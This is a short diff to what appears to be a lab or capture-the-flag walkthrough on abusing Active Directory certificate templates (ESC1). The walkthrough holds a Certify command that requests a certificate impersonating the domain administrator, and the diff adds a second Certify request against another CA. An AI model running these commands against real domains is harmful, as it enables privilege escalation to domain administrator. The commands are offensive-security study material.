@@ -107,6 +107,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 We can request a certificate for the domain administrator.
 ```bash
 Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC1 /altname:essos\administrator /sid:S-1-5-21-1394808576-3393508183-1134699666-500
+
+
+.\Certify.exe request /ca:DC02\darkzero-ext-DC02-CA /template:User
 ```
 
 then convert to PFX
